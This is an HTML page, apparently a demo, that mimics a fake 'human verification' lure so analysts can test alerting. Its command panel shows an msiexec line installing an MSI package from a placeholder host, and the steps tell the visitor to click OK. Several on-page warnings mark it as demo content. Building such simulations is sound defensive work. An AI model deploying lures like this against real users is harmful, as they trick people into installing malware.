...
<html lang="en">
  ...
  <body>
    <main class="card">
      <div class="kicker">Human verification required</div>
      <h1>Complete the security check</h1>
      <p>Demo only. This simulates a verification lure so analysts can test alerting. Do not execute any real command.</p>
      <div class="grid">
        <section class="panel">
          <h3>Steps</h3>
          <ul class="steps">
...
<li>Click OK</li>
        ...
        <section class="panel">
          <h3>Command (demo)</h3>
          <div class="code">msiexec /i https://example.invalid/verify.msi</div>
          <div class="warn">Demo content only. Do not execute on real systems.</div>
        </section>
      </div>
      <a class="cta" href="#">Verify Now</a>
    </main>
  </body>
</html>
